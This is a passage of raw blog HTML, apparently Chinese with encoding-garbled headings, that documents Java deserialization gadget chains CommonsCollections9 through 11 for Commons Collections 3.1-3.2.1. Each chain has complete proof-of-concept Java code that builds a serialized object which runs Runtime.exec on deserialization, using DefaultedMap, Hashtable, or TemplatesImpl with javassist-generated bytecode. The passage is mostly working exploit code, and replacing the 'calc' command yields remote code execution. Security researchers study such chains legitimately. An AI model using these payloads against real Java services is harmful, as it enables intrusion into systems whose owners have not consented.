class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><span class="hljs-comment">//?? BadAttributeValueExpException</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DefaultedMap</span>.</span></span>get<span class="hljs-literal">()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br><br></code></pre></td></tr></table></figure>

<h4 id="å…³é”®ç±»-8"><a href="#å…³é”®ç±»-8" class="headerlink" title="å…³é”®ç±»"></a>å…³é”®ç±»</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">DefaultedMap</span><br><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">BadAttributeValueExpException</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br></code></pre></td></tr></table></figure>

<p>æ¢…å­é…’å¸ˆå‚…æäº¤çš„ CommonsCollections9ï¼Œä¸»è¦åˆ©ç”¨çš„æ˜¯ CommonsCollections:3.2 ç‰ˆæœ¬æ–°å¢çš„ DefaultedMap æ¥ä»£æ›¿ LazyMapï¼Œå› ä¸ºè¿™ä¸¤ä¸ª Map æœ‰åŒæ ·çš„ get å‡½æ•°å¯ä»¥è¢«åˆ©ç”¨</p>
<h3 id="Gadget-8"><a href="#Gadget-8" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC9;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.DefaultedMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC9</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = DefaultedMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(fakechainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br>        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        setFieldValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CommonsCollections10"><a href="#CommonsCollections10" class="headerlink" title="CommonsCollections10"></a>CommonsCollections10</h2><h3 id="Pre-9"><a href="#Pre-9" class="headerlink" title="Pre"></a>Pre</h3><h4 id="é™åˆ¶-9"><a href="#é™åˆ¶-9" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><blockquote>
<p>jdk æš‚æ— é™åˆ¶</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="åˆ©ç”¨é“¾-9"><a href="#åˆ©ç”¨é“¾-9" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Hashtable.readObject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> Hashtable.reconstitutionPut<br>    -&gt; key.hashCode<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">TiedMapEntry</span>.<span class="hljs-title">hashCode</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> TiedMapEntry.getValue<br>    -&gt; TiedMapEntry.<span class="hljs-keyword">map</span>.get<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">LazyMap</span>.<span class="hljs-title">get</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> factory.transform<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">ChainedTransformer</span>.<span class="hljs-title">transform</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> Runtime.getRuntime().exec()<br></code></pre></td></tr></table></figure>

<h4 id="å…³é”®ç±»-9"><a href="#å…³é”®ç±»-9" class="headerlink" title="å…³é”®ç±»"></a>å…³é”®ç±»</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br><span class="hljs-attribute">Hashtable</span><br></code></pre></td></tr></table></figure>

<h3 id="Gadget-9"><a href="#Gadget-9" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC10;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC10</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        Hashtable ht = <span class="hljs-keyword">new</span> Hashtable();<br>        ht.put(<span class="hljs-string">&quot;c&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>);<br>        Field tableF = Hashtable.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] table =(Object[]) tableF.get(ht);<br>        Object entry = table[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(entry==<span class="hljs-keyword">null</span>)&#123;<br>            entry = table[<span class="hljs-number">1</span>];<br>        &#125;<br>        Field keyF = entry.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(entry,tiedMapEntry);<br>        Field iTransformers = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformers.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformers.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(ht);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CommonsCollections11"><a href="#CommonsCollections11" class="headerlink" title="CommonsCollections11"></a>CommonsCollections11</h2><h3 id="Pre-10"><a href="#Pre-10" class="headerlink" title="Pre"></a>Pre</h3><h4 id="é™åˆ¶-10"><a href="#é™åˆ¶-10" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><blockquote>
<p>jdk æš‚æ— é™åˆ¶</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="å…³é”®ç±»-10"><a href="#å…³é”®ç±»-10" class="headerlink" title="å…³é”®ç±»"></a>å…³é”®ç±»</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">HashSet</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure>

<h4 id="åˆ©ç”¨é“¾-10"><a href="#åˆ©ç”¨é“¾-10" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br>					<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h3 id="Gadget-10"><a href="#Gadget-10" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC11;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC11</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Cat&quot;</span> + System.nanoTime());<br>        ctc.setSuperclass(cp.getCtClass(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br><br>        InvokerTransformer fakeinvokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, fakeinvokerTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, templatesimpl);<br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<br>        hs.add(<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field mapF = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        mapF.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hm_tmp = (HashMap) mapF.get(hs);<br><br>        Field tableF = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] arr = (Object[]) tableF.get(hm_tmp);<br><br>        Object node = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-keyword">null</span>) &#123;<br>            node = arr[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        Field keyF = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(node, tiedMapEntry);<br><br>        Field iMethodNameF = InvokerTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iMethodName&quot;</span>);<br>        iMethodNameF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iMethodNameF.set(fakeinvokerTransformer, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CommonsCollections12"><a href="#CommonsCollections12" class="headerlink" title="CommonsCollections12"></a>CommonsCollections12</h2><h3 id="Pre-11"><a href="#Pre-11" class="headerlink" title="Pre"></a>Pre</h3><h4 id="é™åˆ¶-11"><a href="#é™åˆ¶-11" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><blockquote>
<p>jdk æš‚æ— é™åˆ¶</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
